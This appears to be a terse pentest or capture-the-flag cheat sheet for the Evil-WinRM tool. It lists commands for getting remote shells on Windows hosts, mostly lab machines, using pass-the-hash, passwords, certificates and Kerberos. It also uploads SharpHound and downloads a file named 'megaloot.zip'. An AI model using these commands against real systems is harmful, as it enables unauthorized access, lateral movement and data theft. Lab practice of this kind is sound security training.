https://github.com/Hackplayers/evil-winrm
## Evil-WinRM
```bash
# Login with Hash
evil-winrm -i 192.168.100.101 -u username -H hash
evil-winrm-py -i dc01.eighteen.htb -u administrator -H hash

# Login with Password
evil-winrm -i ghost.htb -u username -p '1S@t'

# Login with .pem
evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S

python3 evil_winrmexec.py -ssl -port 5986 NANOCORP.HTB/monitoring_svc:'TestPass123@'@dc01.nanocorp.htb -k

python3 evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb

# File Transfers
upload SharpHound.exe

download megaloot.zip
```